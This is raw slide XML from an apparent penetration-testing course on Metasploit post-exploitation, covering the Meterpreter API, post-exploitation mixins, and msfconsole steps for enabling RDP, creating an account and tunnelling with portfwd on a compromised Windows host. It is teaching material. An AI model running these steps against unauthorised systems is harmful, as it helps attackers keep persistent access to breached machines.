            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit fontScale="62500" lnSpcReduction="20000"/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="114300" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t>The Meterpreter API acts as the bridge between the Metasploit console (the Ruby client) and the compromised target (the Meterpreter server).</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="114300" lvl="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-IN" b="1" dirty="0"/>
              <a:t>Server/Client Architecture:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t> Despite the network connection direction, the victim machine running the payload is referred to as the </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" b="1" dirty="0"/>
              <a:t>server</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t>, and the machine running the Metasploit console is the </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" b="1" dirty="0"/>
              <a:t>client</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t>. </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="114300" lvl="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-IN" b="1" dirty="0"/>
              <a:t>Modular Extensions:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t> The core of Meterpreter is lightweight. Most of its power comes from </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" b="1" dirty="0"/>
              <a:t>Extensions</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t> (e.g., </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" dirty="0" err="1"/>
              <a:t>stdapi</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t>, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" dirty="0" err="1"/>
              <a:t>priv</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t>, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" dirty="0" err="1"/>
              <a:t>mimikatz</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t>). When you issue a command like screenshot or </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" dirty="0" err="1"/>
              <a:t>hashdump</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t>, the client sends a request to the server, which then loads the necessary extension into memory to execute the task.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="114300" lvl="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-IN" b="1" dirty="0"/>
              <a:t>Protocol:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t> Meterpreter uses a structured messaging protocol (TLVs — Type-Length-Value) over an encrypted channel to handle these requests. </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="114300" lvl="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-IN" b="1" dirty="0"/>
              <a:t>Development:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t> Because the API is modular, developers can write their own extensions in C, Python, Java, or PHP. These extensions interact with the </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" dirty="0" err="1"/>
              <a:t>metsrv</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t> core, which provides the basic primitives for memory management, process injection, and network communication. </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-IN" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="37539953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53D52-851E-16E6-9C82-9D137DD54ABF}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="628650" y="934579"/>
            <a:ext cx="7886700" cy="687744"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit fontScale="90000"/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-IN" b="1" dirty="0"/>
              <a:t>Post-Exploitation </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" b="1" dirty="0" err="1"/>
              <a:t>Mixins</a:t>
            </a:r>
            <a:endParaRPr lang="en-IN" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Text Placeholder 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{12BBD723-9FE3-7CEF-BF3B-0C634A2EAB54}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="628650" y="1622324"/>
            <a:ext cx="7886700" cy="4723298"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit fontScale="62500" lnSpcReduction="20000"/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="114300" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t>While the "Meterpreter API" refers to the communication protocol and extension system within the payload, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" b="1" dirty="0" err="1"/>
              <a:t>Mixins</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t> (specifically </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" b="1" dirty="0"/>
              <a:t>Post-Exploitation </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" b="1" dirty="0" err="1"/>
              <a:t>Mixins</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t>) refer to a layer of abstraction within the Metasploit Framework itself (written in Ruby). </a:t>
            </a:r>
            <a:endParaRPr lang="en-IN" sz="1800" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="114300" lvl="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-IN" b="1" dirty="0"/>
              <a:t>The Purpose of </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" b="1" dirty="0" err="1"/>
              <a:t>Mixins</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" b="1" dirty="0"/>
              <a:t>:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t> In software engineering, a </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" dirty="0" err="1"/>
              <a:t>mixin</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t> is a class containing methods for use by other classes without having to inherit from the parent class. In Metasploit, Post-Exploitation </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" dirty="0" err="1"/>
              <a:t>Mixins</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t> are designed to provide a </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" b="1" dirty="0"/>
              <a:t>consistent API</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t> for module developers. </a:t>
            </a:r>
            <a:endParaRPr lang="en-IN" sz="1800" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="114300" lvl="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-IN" b="1" dirty="0"/>
              <a:t>Abstracting Session Types:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t> As an attacker, you might have different types of sessions: a basic Meterpreter session, a standard Windows command shell, or a PowerShell session. Writing code that handles every platform-specific difference for every session type is inefficient. </a:t>
            </a:r>
            <a:endParaRPr lang="en-IN" sz="1800" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="114300" lvl="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-IN" b="1" dirty="0"/>
              <a:t>How it Works:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t> Instead of writing raw commands for a specific shell, developers use these </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" dirty="0" err="1"/>
              <a:t>mixins</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t> (located in lib/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" dirty="0" err="1"/>
              <a:t>msf</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t>/core/post/). These </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" dirty="0" err="1"/>
              <a:t>mixins</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t> provide "helper" methods that normalize interactions: </a:t>
            </a:r>
            <a:endParaRPr lang="en-IN" sz="1800" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-IN" b="1" dirty="0" err="1"/>
              <a:t>Msf</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" b="1" dirty="0"/>
              <a:t>::Post::Common:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t> Provides core utilities like </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" dirty="0" err="1"/>
              <a:t>cmd_exec</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t> (which runs a command regardless of whether the session is Meterpreter or a shell) or </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" dirty="0" err="1"/>
              <a:t>session_type</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t>? checks.</a:t>
            </a:r>
            <a:endParaRPr lang="en-IN" sz="1600" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-IN" b="1" dirty="0" err="1"/>
              <a:t>Msf</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" b="1" dirty="0"/>
              <a:t>::Post::Windows::Priv:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t> Provides standardized ways to check for administrative privileges across different platforms.</a:t>
            </a:r>
            <a:endParaRPr lang="en-IN" sz="1600" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-IN" b="1" dirty="0" err="1"/>
              <a:t>Msf</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" b="1" dirty="0"/>
              <a:t>::Post::File:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t> Abstracts file system operations (upload, download, search) so the module code doesn't need to know if the target is Linux or Windows.</a:t>
            </a:r>
            <a:endParaRPr lang="en-IN" sz="1600" dirty="0"/>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-IN" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="28753043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43B97-9D1C-0207-695D-2A3715DF86ED}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="628650" y="934579"/>
            <a:ext cx="7886700" cy="579590"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit fontScale="90000"/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t>Remote Desktop Protocol (RDP)</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Text Placeholder 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{1221E451-7710-E7B2-6B12-D6A9DC876DBA}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="628650" y="1514170"/>
            <a:ext cx="7886700" cy="4831452"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit fontScale="40000" lnSpcReduction="20000"/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="114300" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t>Enabling Remote Desktop Protocol (RDP) on a compromised Windows system is a standard post-exploitation technique used to gain a graphical user interface (GUI) for further interaction. In a professional penetration testing context, this is typically handled via established Metasploit modules rather than manual registry manipulation, which ensures higher reliability and automated cleanup. </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="114300" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-IN" b="1" dirty="0"/>
              <a:t>1. Enabling RDP via Post-Exploitation Modules</a:t>
            </a:r>
            <a:endParaRPr lang="en-IN" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="114300" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t>The most efficient and reliable way to enable RDP within a Meterpreter session is by using the built-in Metasploit post-exploitation module. This module automates the necessary registry changes, firewall modifications, and user account creation.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="114300" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-IN" b="1" dirty="0"/>
              <a:t>Steps:</a:t>
            </a:r>
            <a:endParaRPr lang="en-IN" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="114300" lvl="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-IN" b="1" dirty="0"/>
              <a:t>Background your session:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t> Once you have a Meterpreter session, use the background command to return to the </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" dirty="0" err="1"/>
              <a:t>msfconsole</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t> prompt.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="114300" lvl="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-IN" b="1" dirty="0"/>
              <a:t>Select the module:</a:t>
            </a:r>
            <a:endParaRPr lang="en-IN" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="114300" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t>Bash</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="114300" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t>use post/windows/manage/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" dirty="0" err="1"/>
              <a:t>enable_rdp</a:t>
            </a:r>
            <a:endParaRPr lang="en-IN" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="114300" lvl="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-IN" b="1" dirty="0"/>
              <a:t>Configure the session:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t> Identify the session ID of your active Meterpreter connection and set it.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="114300" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t>Bash</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="114300" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t>set SESSION &lt;</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" dirty="0" err="1"/>
              <a:t>session_id</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t>&gt;</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="114300" lvl="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-IN" b="1" dirty="0"/>
              <a:t>Optional Parameters:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t> You can specify a username and password if you want to create a new user account specifically for this access:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="114300" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t>Bash</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="114300" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t>set USERNAME &lt;</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" dirty="0" err="1"/>
              <a:t>new_username</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t>&gt;</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="114300" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t>set PASSWORD &lt;</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" dirty="0" err="1"/>
              <a:t>new_password</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t>&gt;</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="114300" lvl="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-IN" b="1" dirty="0"/>
              <a:t>Execute:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t> Run the module with exploit or run.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-IN" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="2192377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266FE6D-20A9-E188-1998-6F58C64130DD}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="628650" y="993058"/>
            <a:ext cx="7886700" cy="5352563"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit fontScale="40000" lnSpcReduction="20000"/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="114300" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-IN" b="1" dirty="0"/>
              <a:t>2. </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" b="1" dirty="0" err="1"/>
              <a:t>Tunneling</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" b="1" dirty="0"/>
              <a:t> RDP with </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" b="1" dirty="0" err="1"/>
              <a:t>portfwd</a:t>
            </a:r>
            <a:endParaRPr lang="en-IN" sz="1800" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="114300" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t>Once RDP is enabled on the remote host, you cannot connect to it directly if the system is behind a firewall or NAT. You must tunnel the RDP traffic (typically TCP port 3389) through the existing Meterpreter session.</a:t>
            </a:r>
            <a:endParaRPr lang="en-IN" sz="1800" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="114300" lvl="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-IN" b="1" dirty="0"/>
              <a:t>Establish the tunnel:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t> From within your active Meterpreter session, use the </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" dirty="0" err="1"/>
              <a:t>portfwd</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t> command to forward a local port on your machine to the remote target's RDP port:</a:t>
            </a:r>
            <a:endParaRPr lang="en-IN" sz="1800" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="114300" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t>Bash</a:t>
            </a:r>
            <a:endParaRPr lang="en-IN" sz="1800" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="114300" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-IN" dirty="0" err="1"/>
              <a:t>portfwd</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t> add -l 3389 -p 3389 -r 127.0.0.1</a:t>
            </a:r>
            <a:endParaRPr lang="en-IN" sz="1800" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="571500" lvl="1" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t>-l 3389: This is the port on </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" b="1" dirty="0"/>
              <a:t>your</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t> (attacker) machine that you will connect to.</a:t>
            </a:r>
            <a:endParaRPr lang="en-IN" sz="1600" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="571500" lvl="1" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t>-p 3389: The port on the </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" b="1" dirty="0"/>
              <a:t>target</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t> machine where the RDP service is listening.</a:t>
            </a:r>
            <a:endParaRPr lang="en-IN" sz="1600" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="571500" lvl="1" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t>-r 127.0.0.1: The target IP (relative to the compromised host).</a:t>
            </a:r>
            <a:endParaRPr lang="en-IN" sz="1600" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="114300" lvl="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-IN" b="1" dirty="0"/>
              <a:t>Connect:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t> On your local system, use an RDP client to connect to 127.0.0.1:3389. The traffic will be encrypted and passed through your Meterpreter session to the target.</a:t>
            </a:r>
            <a:endParaRPr lang="en-IN" sz="1800" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="114300" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-IN" b="1" dirty="0"/>
              <a:t>3. Critical Security Considerations</a:t>
            </a:r>
            <a:endParaRPr lang="en-IN" sz="1800" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="114300" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t>Enabling RDP on a compromised system is inherently risky and can easily be detected by security operations </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" dirty="0" err="1"/>
              <a:t>centers</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t> (SOCs) or Endpoint Detection and Response (EDR) solutions.</a:t>
            </a:r>
            <a:endParaRPr lang="en-IN" sz="1800" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="114300" lvl="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-IN" b="1" dirty="0"/>
              <a:t>Log Generation:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t> Enabling RDP involves changing registry keys (specifically </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" dirty="0" err="1"/>
              <a:t>fDenyTSConnections</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t>) and modifying firewall rules. Modern EDR tools log these specific activities as indicators of compromise (IoC).</a:t>
            </a:r>
            <a:endParaRPr lang="en-IN" sz="1800" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="114300" lvl="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-IN" b="1" dirty="0"/>
              <a:t>Authentication:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t> Always use strong, unique credentials. Avoid using default or easily guessable passwords for any accounts created during testing.</a:t>
            </a:r>
            <a:endParaRPr lang="en-IN" sz="1800" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="114300" lvl="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-IN" b="1" dirty="0"/>
              <a:t>Network Level Authentication (NLA):</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t> NLA is a security feature that requires the user to authenticate before a full RDP session is established. It is recommended to keep NLA enabled, as it prevents some types of pre-authentication exploits.</a:t>
            </a:r>
            <a:endParaRPr lang="en-IN" sz="1800" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="114300" lvl="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-IN" b="1" dirty="0"/>
              <a:t>Cleanup:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t> Always remove the added user accounts and revert the registry/firewall changes immediately after your engagement is complete. Use the clean or cleanup options often available in post-exploitation modules to ensure no artifacts are left behind.</a:t>
            </a:r>
            <a:endParaRPr lang="en-IN" sz="1800" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="114300" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:endParaRPr lang="en-IN" sz="1800" dirty="0"/>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-IN" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="28289143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24086-18F1-DD49-045D-E66D72AC83F9}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="628650" y="934579"/>
            <a:ext cx="7886700" cy="422274"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit fontScale="90000"/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
